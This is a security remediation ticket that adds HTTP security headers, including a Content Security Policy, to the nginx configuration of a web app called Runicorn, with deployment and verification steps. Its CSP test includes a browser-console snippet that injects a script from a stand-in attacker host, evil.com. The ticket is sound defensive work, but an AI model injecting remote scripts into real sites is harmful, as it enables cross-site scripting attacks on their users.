# FIX #2: Security Headers (nginx)

**Issue**: Missing HTTP security headers  
**Severity**: CRITICAL ❌  
**OWASP**: A05:2021 - Security Misconfiguration  
**Priority**: DIESE WOCHE (This Week)

---

## Problem

Current `nginx.conf` has NO security headers:

```nginx
server {
    listen 3002;
    server_name localhost;

    root /usr/share/nginx/html;
    index index.html;

    # ❌ NO SECURITY HEADERS!

    location / {
        try_files $uri $uri/ /index.html;
    }
}
```

**Impact:**
- **Clickjacking**: Runicorn can be embedded in iframe for phishing
- **XSS**: No Content Security Policy to block malicious scripts
- **MIME Sniffing**: Browser could misinterpret file types
- **Information Leakage**: Server version exposed

---

## Solution

Replace `nginx.conf` with security-hardened version:

```nginx
# nginx.conf - PRODUCTION VERSION with Security Headers

server {
    listen 3002;
    server_name localhost;

    root /usr/share/nginx/html;
    index index.html;

    # ========================================
    # SECURITY HEADERS (OWASP Best Practices)
    # ========================================
    
    # Prevent clickjacking (deny all iframe embedding)
    add_header X-Frame-Options "DENY" always;
    
    # Prevent MIME-sniffing
    add_header X-Content-Type-Options "nosniff" always;
    
    # Enable XSS filter (legacy browsers)
    add_header X-XSS-Protection "1; mode=block" always;
    
    # Referrer Policy (protect user privacy)
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    
    # Permissions Policy (disable unnecessary browser features)
    add_header Permissions-Policy "camera=(), microphone=(), geolocation=(self), payment=(), usb=(), interest-cohort=()" always;
    
    # Content Security Policy (CSP) - CRITICAL!
    # This prevents XSS attacks by whitelisting allowed resources
    add_header Content-Security-Policy "
        default-src 'self';
        script-src 'self' 'unsafe-inline' https://analytics.rnltlabs.de https://errors.rnltlabs.de https://unpkg.com;
        style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://unpkg.com;
        font-src 'self' https://fonts.gstatic.com;
        img-src 'self' data: https://*.tile.openstreetmap.org;
        connect-src 'self' https://runicorn-api-proxy.*.workers.dev https://analytics.rnltlabs.de https://errors.rnltlabs.de https://nominatim.openstreetmap.org;
        frame-ancestors 'none';
        base-uri 'self';
        form-action 'self';
        upgrade-insecure-requests;
    " always;
    
    # HTTP Strict Transport Security (HSTS)
    # ONLY enable this AFTER HTTPS is working!
    # Uncomment after fixing Issue #3:
    # add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    
    # Remove server version header (information disclosure)
    server_tokens off;
    
    # ========================================
    # SPA ROUTING (React Router)
    # ========================================
    location / {
        try_files $uri $uri/ /index.html;
    }

    # ========================================
    # STATIC ASSET CACHING
    # ========================================
    location ~* \.(js|css|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot)$ {
        expires 1y;
        add_header Cache-Control "public, immutable";
        
        # Re-add security headers (nginx bug: location-level headers override server-level)
        add_header X-Frame-Options "DENY" always;
        add_header X-Content-Type-Options "nosniff" always;
        add_header X-XSS-Protection "1; mode=block" always;
        add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    }
}
```

---

## CSP Policy Explanation

```
default-src 'self';
```
- Only load resources from same origin by default

```
script-src 'self' 'unsafe-inline' https://analytics.rnltlabs.de https://errors.rnltlabs.de https://unpkg.com;
```
- **'self'**: Allow scripts from runicorn.io
- **'unsafe-inline'**: ⚠️ Required for Vite dev build (should remove for production - see note below)
- **analytics.rnltlabs.de**: Umami analytics script
- **errors.rnltlabs.de**: GlitchTip error tracking
- **unpkg.com**: Leaflet library (consider self-hosting in future)

```
style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://unpkg.com;
```
- **'unsafe-inline'**: ⚠️ Required for Tailwind CSS (generated inline styles)
- **fonts.googleapis.com**: Google Fonts CSS

```
img-src 'self' data: https://*.tile.openstreetmap.org;
```
- **data:**: Allow data URIs (for base64 images)
- **\*.tile.openstreetmap.org**: OpenStreetMap tiles

```
connect-src 'self' https://runicorn-api-proxy.*.workers.dev https://analytics.rnltlabs.de ...
```
- **Cloudflare Worker**: GraphHopper proxy (from Fix #1)
- **analytics.rnltlabs.de**: Umami tracking
- **errors.rnltlabs.de**: GlitchTip error reporting
- **nominatim.openstreetmap.org**: Geocoding search

```
frame-ancestors 'none';
```
- Same as `X-Frame-Options: DENY` (CSP version)

```
upgrade-insecure-requests;
```
- Automatically upgrade HTTP requests to HTTPS (requires HTTPS enabled)

---

## Deployment Steps

### Step 1: Update nginx.conf

```bash
# On your server (Hetzner VM or Docker container):
nano nginx.conf

# Paste the new configuration from above
# Save and exit (Ctrl+X, Y, Enter)
```

### Step 2: Test configuration

```bash
# Test nginx config for syntax errors:
nginx -t

# Expected output:
# nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
# nginx: configuration file /etc/nginx/nginx.conf test is successful
```

### Step 3: Reload nginx

```bash
# Reload nginx (zero-downtime):
nginx -s reload

# OR restart nginx service:
systemctl restart nginx
```

### Step 4: Update Docker image (if using Docker)

```dockerfile
# Dockerfile - Already correct:
COPY nginx.conf /etc/nginx/conf.d/default.conf
```

```bash
# Rebuild Docker image:
docker build -t runicorn:latest .

# Push to registry:
docker push your-registry/runicorn:latest

# Deploy (if using Kubernetes/Docker Compose):
kubectl rollout restart deployment/runicorn
# OR
docker-compose up -d
```

---

## Verification

### Test 1: Check headers are present

```bash
# Test locally:
curl -I https://runicorn.io

# Should include:
# X-Frame-Options: DENY
# X-Content-Type-Options: nosniff
# Content-Security-Policy: default-src 'self'; ...
```

### Test 2: Browser DevTools

1. Open https://runicorn.io
2. Open DevTools → Network tab
3. Reload page
4. Click on main document (first request)
5. Check "Response Headers" section
6. Verify all security headers are present

### Test 3: CSP Violation Test

Open browser console on runicorn.io:

```javascript
// Try loading unauthorized script (should be blocked):
const script = document.createElement('script')
script.src = 'https://evil.com/malicious.js'
document.head.appendChild(script)

// Expected: CSP error in console
// "Refused to load the script 'https://evil.com/malicious.js' because it violates the following Content Security Policy directive..."
```

### Test 4: SecurityHeaders.com Scan

```
1. Go to https://securityheaders.com
2. Enter: https://runicorn.io
3. Expected grade: A or A+
```

---

## Troubleshooting

### Issue: CSP blocks Vite dev server

If you're testing locally with `npm run dev`, CSP will block Vite's HMR (Hot Module Replacement):

**Solution**: Disable CSP in development:

```nginx
# nginx-dev.conf (for local development)
server {
    # ... same config BUT comment out CSP:
    
    # add_header Content-Security-Policy "..." always;  # DISABLED for dev
}
```

OR use `vite.config.ts` to set CSP meta tag conditionally:

```typescript
// vite.config.ts
export default defineConfig({
  plugins: [
    react(),
    {
      name: 'csp-dev',
      transformIndexHtml(html) {
        if (process.env.NODE_ENV === 'development') {
          // Relaxed CSP for dev
          return html.replace(
            '</head>',
            '<meta http-equiv="Content-Security-Policy" content="default-src * \'unsafe-inline\' \'unsafe-eval\' data: blob:;"></head>'
          )
        }
        return html
      },
    },
  ],
})
```

### Issue: Google Fonts blocked

If fonts don't load:

```
Error: Refused to load stylesheet from 'https://fonts.googleapis.com/...'
```

**Solution**: Already fixed in CSP above (`style-src ... https://fonts.googleapis.com`)

---

## Advanced: Remove 'unsafe-inline' (Production Hardening)

**Problem**: `'unsafe-inline'` in `script-src` weakens CSP (allows inline scripts → XSS risk)

**Solution**: Use nonce-based CSP

```typescript
// vite.config.ts - Generate CSP nonce
import crypto from 'crypto'

export default defineConfig({
  plugins: [
    react(),
    {
      name: 'csp-nonce',
      transformIndexHtml(html) {
        const nonce = crypto.randomBytes(16).toString('base64')
        
        // Add nonce to all inline scripts
        html = html.replace(/<script>/g, `<script nonce="${nonce}">`)
        
        // Add CSP meta tag with nonce
        return html.replace(
          '</head>',
          `<meta http-equiv="Content-Security-Policy" content="script-src 'self' 'nonce-${nonce}' https://analytics.rnltlabs.de;"></head>`
        )
      },
    },
  ],
})
```

**Note**: This requires server-side rendering (SSR) or build-time nonce injection. For static SPA, `'unsafe-inline'` is acceptable if you trust your build process.

---

## Related Issues

- Issue #3: HTTPS Enforcement (required for HSTS header)
- Issue #11: Source Maps (CSP can block source maps if misconfigured)

---

**Status**: ❌ NOT FIXED  
**Assigned**: DevOps / Roman Reinelt  
**Due**: 2025-10-29 (This Week)  
**Estimate**: 30 minutes
